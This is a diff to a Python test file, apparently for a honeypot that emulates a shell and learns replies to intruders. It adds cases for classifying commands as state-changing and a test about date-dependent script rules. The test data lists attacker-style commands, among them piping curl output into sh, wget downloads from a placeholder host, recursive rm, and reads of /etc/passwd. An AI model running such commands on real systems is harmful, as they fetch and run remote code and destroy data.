@@ -123,6 +123,10 @@ def test_fill_substitutes_and_refuses_unknown_placeholders():
     ("sudo -u root rm -rf /x", True), ("wget http://192.0.2.1/x", True),
     ("chmod +x x; ./x", True), ("/tmp/.x/run", True), ("busybox wget http://x", True),
     ("curl -s http://x | sh", True), ("export PATH=/x", True),
+    ("find /tmp -type f", False), ("find /tmp -type f -delete", True),
+    ("find / -name x -exec rm {} \\;", True), ("sudo find /tmp -delete", True),
+    ("sort /etc/passwd", False), ("sort -o /tmp/s /etc/passwd", True), ("date", False),
+    ("date -s 2020-01-01", True),
 ])
 def test_may_change_state(line, changes):
     assert learned.may_change_state(line) is changes
@@ -913,6 +917,15 @@ async def test_a_script_reply_needs_the_same_token_bindings(wired):
     out, _, _ = await _session(wired, "b5", "198.51.100.10", [f"echo {a} > /tmp/{a}",
                                                               f"cat /tmp/{a}"])
     assert out[1].reply_step == "learned" and out[1].content == f"{a}\r\n" + PROMPT
+
+
+async def test_a_clock_value_kept_in_a_file_ends_the_script_rule(wired):
+    stamp, read = "date +%F > /tmp/stamp", "cat /tmp/stamp"
+    wired.history = _History({"": PROMPT, stamp: PROMPT, read: "first-day\r\n" + PROMPT})
+    for sid, ip in (("v1", "192.0.2.1"), ("v2", "198.51.100.2"), ("v3", "192.0.2.3")):
+        await _session(wired, sid, ip, [stamp, read])
+    out, _, _ = await _session(wired, "v4", "198.51.100.9", [stamp, read])
+    assert getattr(out[1], "reply_step", None) != "learned"
 
 
 def test_a_reply_for_one_token_length_never_stands_for_another(store):
